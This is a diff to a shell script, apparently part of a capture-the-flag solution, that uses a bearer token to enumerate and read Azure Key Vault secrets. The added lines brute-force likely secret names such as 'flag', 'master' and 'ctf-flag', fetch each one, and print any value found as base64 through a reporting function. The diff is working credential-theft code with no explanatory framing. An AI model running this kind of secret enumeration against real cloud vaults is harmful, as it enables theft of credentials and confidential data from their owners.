@@ -38,14 +38,21 @@ for name in $(echo "$LIST" | jq -r '.value[]?.id | split("/") | last'); do
   say "SP_${name}_AUTH_OK"
   SL=$(curl -sS --max-time 20 -H "Authorization: Bearer $AT" "$SEC/secrets?api-version=7.4")
   say "SEC_${name}_NAMES_B64=$(printf '%s' "$SL" | jq -r '[.value[]?.id|split("/")|last]|join(",")' 2>/dev/null | base64 -w0)"
-  for sn in $(echo "$SL" | jq -r '.value[]?.id | split("/") | last'); do
+  # The SP may have get-only (no list) on the secret vault; try known names directly.
+  for sn in flag FLAG flag-prod prod-flag ctf-flag tbl-flag the-flag dfcd master reporting-flag df26-flag; do
+    H=$(curl -sS --max-time 15 -o /tmp/kv_$sn.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$SEC/secrets/$sn?api-version=7.4" || echo 000)
+    F=$(jq -r '.value // empty' /tmp/kv_$sn.json 2>/dev/null || true)
+    say "TRY_${name}_${sn}_HTTP=$H"
+    if [[ -n "$F" ]]; then
+      say "FLAG_NAME=$sn"
+      say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
+    fi
+  done
+  for sn in $(echo "$SL" | jq -r '.value[]?.id | split("/") | last' 2>/dev/null); do
     SV=$(curl -sS --max-time 20 -H "Authorization: Bearer $AT" "$SEC/secrets/$sn?api-version=7.4")
     F=$(echo "$SV" | jq -r '.value // empty')
-    if [[ -n "$F" ]]; then
-      if [[ "$sn" == "flag" || "$F" == DF26\{* ]]; then
-        say "FLAG_NAME=$sn"
-        say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
-      fi
+    if [[ -n "$F" && ( "$sn" == "flag" || "$F" == DF26\{* ) ]]; then
+      say "FLAG_NAME=$sn"; say "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
     fi
   done
 done
